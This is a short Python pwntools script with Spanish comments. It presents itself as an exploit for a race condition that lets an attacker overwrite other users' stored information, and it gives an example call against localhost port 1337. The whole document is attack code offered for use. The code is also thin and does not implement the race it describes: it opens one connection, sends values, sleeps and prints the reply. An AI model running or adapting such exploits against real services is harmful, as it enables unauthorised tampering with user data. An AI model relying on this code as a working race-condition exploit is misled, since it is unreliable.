from pwn import *
from time import sleep

'''
La función explota una vulnerabilidad de 
"race condition" en un programa que almacena 
información de usuarios en un archivo. Recibe 
cuatro parámetros y el problema radica en la 
validación de permisos antes de actualizar la 
información del usuario, lo que permite a un 
atacante modificar información de otros 
usuarios. El ataque aprovecha la carrera entre 
la verificación de permisos y la actualización 
del archivo.
'''

def exploit(ip_remota, puerto, usuario_malicioso, informacion_maliciosa):
    r = remote(ip_remota, puerto)
    r.sendline(usuario_malicioso)
    r.sendline(informacion_maliciosa)
    sleep(1)
    r.sendline('usuario_legitimo')
    response = r.recvline().decode()
    print(response)

'''
Ejemplo de uso:

exploit('127.0.0.1', 1337, 'admin', 'informacion_maliciosa')
'''